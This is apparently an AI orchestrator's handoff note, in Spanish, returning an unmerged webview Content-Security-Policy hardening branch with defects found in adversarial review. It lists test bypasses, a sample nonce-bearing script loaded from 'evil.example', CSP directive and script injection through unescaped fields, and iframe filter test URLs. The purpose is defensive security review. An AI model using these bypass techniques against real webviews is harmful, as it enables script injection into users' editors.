# DEVOLUCIÓN · WP-V66 · Seguridad de webviews (CSP)

| dato | valor |
| ---- | ----- |
| Estado | **🔶 DEVUELTO — no mergeado**. Obra viva en rama `wp/v66-csp` (7 commits, tip `9f0a5d7`, base `336f481`) |
| Worktree | `C:\S_LAB\wt\v-v66` (conservado con `node_modules` para no reinstalar tras el reinicio) |
| Origen | contrarrevisión adversarial de frontera de confianza (PRACTICAS §4.4.4: «intenta el bypass, no relee la declaración») |
| Fecha | 2026-07-31 · registrado por el **Anfitrión** (orquestador) al congelar el swarm |

## Lo que SÍ está hecho y resiste (no rehacer)

Helper único `src/webview/security.ts` con nonce criptográfico (`crypto.randomBytes(16)`;
hardcodearlo pone 26 tests en rojo) · 25 puntos de render con prueba de facto (62 tests
verdes) · `unsafe-inline`/`unsafe-eval` **lanzan** en los 7 campos del helper · cerco de
iframes correcto (`data:text/html`, `javascript:`, `http://localhost@evil.com`,
`vscode-webview://` → degradan a página inerte, URL escapada) · entradas degeneradas
fail-closed · `<style>`/`<script>` sin nonce cazados · endurecimiento real: 5 paneles a
`{enableScripts:false, localResourceRoots:[]}` y `localResourceRoots` estrechado de
`extensionUri` a `media/` · sin contrabando (package.json, tablas de V80, `tests/exthost/`
= 0 líneas; ids de comandos 61 = 61) · baseline de jest preservado (los mismos 5 rojos
históricos, +62 tests).

## Defectos a corregir (numerados, del contrarrevisor)

**D1 (estructural, bloqueante) — el censo cierra FICHEROS, no PUNTOS DE RENDER.**
Tres formas de entrar en verde con un webview hostil:
- **1B** la regex del censo (`WEBVIEW_SIGNAL`, `tests/unit/webview/webviewCsp.test.ts:426`)
  es textual: aliasar el objeto (`const wv = panel.webview; wv.html = …`) y partir los
  literales (`'<!DOCTYPE ' + 'html>'`) la evade → 62/62 verdes con `eval`, CDN externo,
  `onclick` y `style=`. `Object.assign(panel.webview, {html})` tampoco se caza.
- **7** un render hostil añadido a un fichero ASIGNADOR ya censado
  (`src/core/bootstrap/commands/aiCommands.ts`) → 62/62 verdes: los 6 asignadores tienen
  **cero** verificación de invariantes.
- **8** un render nº 26 exportado en un fichero PRODUCTOR ya censado
  (`src/webview/bootstrapPages.ts`) → 62/62 verdes.
Dirección de arreglo (la decide V, no se prescribe): que la unidad verificada sea el
punto de render y no el fichero — enumeración derivada (no lista a mano) + invariantes
aplicadas a **todo** HTML que produzca cualquier módulo censado, con el test fallando
ante un render no cubierto.

**D2 (explotable, bloqueante) — script externo CON nonce pasa.**
`<script nonce="${nonce}" src="https://evil.example/x.js"></script>` en un productor
censado (probado en `src/uiManager.ts:365`) → 62/62 verdes. La invariante 5
(`webviewCsp.test.ts:292-296`) comprueba que todo `<script>` lleve nonce, nunca mira el
`src`; y `script-src 'nonce-X'` **autoriza al navegador** a ejecutar el script remoto que
porte ese nonce. No cazado por test ni por guarda. (Sin nonce sí cae.)

**D3 — `hasCspMeta` valida presencia, no política; y sirve disco con scripts.**
`src/webview/security.ts:119-121` es regex de presencia: devuelve `true` con CSP
permisiva, con meta vacía y **con la meta dentro de un comentario HTML**. `webViewManager`
sirve entonces el HTML crudo (`src/webViewManager.ts:238-250`) en un panel creado con
`enableScripts: config.enableScripts !== false` (por defecto **true**) y
`localResourceRoots` incluyendo `config.localPath`.

**D4 — el helper no valida origen ni escapa en `styleSource`/`imgSource`/`fontSource`.**
Solo `frameOrigins`/`connectOrigins` pasan por `requireLocalOrigin`. Consecuencias
probadas: origen https externo y comodín `*` aceptados; `styleSource` con `;` **inyecta
directivas arbitrarias** (`script-src *` no contiene el token prohibido); `styleSource`
con `"` **rompe el atributo `content=` e inyecta un `<script>` vivo en el `<head>`**.
Explotabilidad hoy baja (los llamadores pasan `webview.cspSource`), pero el fail-closed
declarado no existe en esos campos.

**D5 (menor) — el test solo inspecciona la PRIMERA meta CSP** (`CSP_META_RE` con `match`
no global, `webviewCsp.test.ts:240-246`): una segunda meta permisiva da 62/62. Inocuo por
la spec (intersección de políticas), pero es punto ciego del contrato.

## Correcciones de contabilidad exigidas al reporte

- El censo son **24** ficheros (18 productores únicos + 6 asignadores) y **25** puntos de
  render, no «21 ficheros».
- Las afirmaciones «TODOS con test» y «guardas que lanzan ante orígenes externos» no se
  sostienen tal como están redactadas: reformularlas al alcance real tras el arreglo.

## Veredicto sobre el ajuste de test `9f0a5d7` (no es defecto)

`tests/unit/core/analyticsService.test.ts:130-136`: `'<html>'` → `'<html'` es relajación
**forzada** por el nuevo contrato (`<html lang="es">`), compensada con una aserción nueva
más fuerte (`Content-Security-Policy`). Neto +3/−1: **adaptado, no debilitado.**

## Cómo se retoma tras el reinicio

Worker fresco (agente background) con este documento como brief, misma rama
`wp/v66-csp`, mismo worktree, commits nuevos de corrección (no reescribir historia).
Al cerrar: **nueva contrarrevisión adversarial obligatoria** (misma clase) que reintente
los ocho bypass del informe original — los tres no cazados deben quedar en rojo.

— **Anfitrión** (orquestador)
